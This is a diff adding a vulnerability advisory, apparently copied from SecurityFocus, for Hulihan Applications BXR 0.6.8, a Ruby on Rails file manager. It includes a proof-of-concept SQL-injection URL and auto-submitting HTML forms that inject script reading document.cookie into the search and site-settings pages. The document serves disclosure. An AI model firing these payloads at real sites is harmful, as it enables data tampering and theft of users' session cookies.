@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/42247/info
+
+Hulihan Applications BXR is prone to an SQL-injection vulnerability and multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database or to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials, control how the site is viewed, and launch other attacks.
+
+Hulihan Applications BXR 0.6.8 is vulnerable; other versions may also be affected.
+
+http://www.example.com/folder/list?order_by=filesize&#039;+SQL
+
+
+<form action="http://host/search/show_results" method="post" name="main" >
+
+<input type="hidden" name="search_type" value="filename" />
+<input type="hidden" name="search[query]" value=&#039;1"><script>alert(document.cookie)</script>&#039; />
+<input type="hidden" name="commit" value="Find!" />
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+mytagname"><script>alert(document.cookie)</script>
+
+
+<form action="http://host/settings/update_settings" method="post" name="main" >
+
+<input type="hidden" name="setting[site_title]" value=&#039;BXR File Management System"><script>alert(document.cookie)</script>&#039; />
+<input type="hidden" name="setting[site_keywords]" value="BXR, Open Source File Management System" />
+<input type="hidden" name="setting[site_description]" value="The Free, Open Source, Ruby on Rails File Management System." />
+<input type="hidden" name="setting[let_users_change_default_folder]" value="0" />
+<input type="hidden" name="setting[use_ferret]" value="0" />
+<input type="hidden" name="setting[overwrite_existing_files]" value="0" />
+<input type="hidden" name="commit" value="Update Settings" />
+
+</form>
+<script>
+document.main.submit();
+</script>
